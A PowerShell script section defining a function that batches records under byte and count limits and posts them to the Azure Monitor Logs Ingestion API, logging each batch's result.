# ============================================================
# 6.  Ingest via Logs Ingestion API  (chunked — stays under 1 MB per request)
#     API limits: 1 MB body, max 10 000 records per request
# ============================================================

$MaxBodyBytes   = 900KB    # stay safely under the 1 MB limit
$MaxRecordsBatch = 10000   # hard API limit per request

function Send-LogBatch {
    param(
        [string]$StreamName,
        [array] $Records
    )
    if ($Records.Count -eq 0) { return }

    $uri = "$DceIngestionUrl/dataCollectionRules/$DcrImmutableId/streams/$($StreamName)?api-version=2023-01-01"
    $headers = @{
        "Authorization" = "Bearer $BearerToken"
        "Content-Type"  = "application/json"
    }

    # Split into chunks that respect both byte and record limits
    $chunks    = [System.Collections.Generic.List[object]]::new()
    $chunk     = [System.Collections.Generic.List[object]]::new()
    $chunkSize = 0

    foreach ($rec in $Records) {
        $recJson  = $rec | ConvertTo-Json -Depth 10 -Compress
        $recBytes = [System.Text.Encoding]::UTF8.GetByteCount($recJson) + 1  # +1 for comma

        if (($chunkSize + $recBytes -gt $MaxBodyBytes -or $chunk.Count -ge $MaxRecordsBatch) -and $chunk.Count -gt 0) {
            $chunks.Add($chunk.ToArray())
            $chunk     = [System.Collections.Generic.List[object]]::new()
            $chunkSize = 0
        }

        $chunk.Add($rec)
        $chunkSize += $recBytes
    }
    if ($chunk.Count -gt 0) { $chunks.Add($chunk.ToArray()) }

    $batchNum = 1
    foreach ($batch in $chunks) {
        $body        = $batch | ConvertTo-Json -Depth 10 -Compress
        $bodySizeKB  = [System.Math]::Round([System.Text.Encoding]::UTF8.GetByteCount($body) / 1KB, 1)
        $label       = if ($chunks.Count -gt 1) { " [batch $batchNum/$($chunks.Count), ${bodySizeKB} KB]" } else { " [${bodySizeKB} KB]" }

        try {
            Invoke-RestMethod -Method POST -Uri $uri -Headers $headers -Body $body -ErrorAction Stop | Out-Null
            Write-Host "[INGEST] $StreamName$label → $($batch.Count) records OK." -ForegroundColor Green
        } catch {
            $status = $_.Exception.Response?.StatusCode.value__ ?? "?"
            $msg    = $_.ErrorDetails?.Message ?? $_.Exception.Message
            Write-Warning "[INGEST] $StreamName$label failed (HTTP $status): $msg"
        }
        $batchNum++
    }
}

